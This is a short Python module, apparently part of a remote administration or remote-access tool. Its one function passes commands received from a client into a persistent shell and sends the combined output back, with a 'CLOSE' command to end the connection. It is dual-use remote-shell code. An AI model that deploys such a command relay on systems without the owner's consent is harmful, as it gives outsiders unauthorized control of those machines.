import time

def terminal(data, client, shell_handler, converter):
    try:
        
        shell, stdout_queue, stderr_queue = shell_handler.get_shell()
        command = data["terminal"]
        
        shell.stdin.write(command + "\n")
        shell.stdin.flush()

        time.sleep(0.5)
        output = ""

        while not stdout_queue.empty() or not stderr_queue.empty():
            while not stdout_queue.empty():
                output += stdout_queue.get_nowait()
            while not stderr_queue.empty():
                output += stderr_queue.get_nowait()
        
        if command == "CLOSE":
            shell_handler.close_connection()
            output = "Connection closed. You can send a command to initiate it again or close the window"

        response = output.replace("Not enough memory resources are available to process this command.", "") if output else "Command executed successfully.\n"
        
        client.send_message(converter.encode({"terminal": response}))

    except Exception as e:
        client.send_message(converter.encode({"terminal_logger": str(e)}))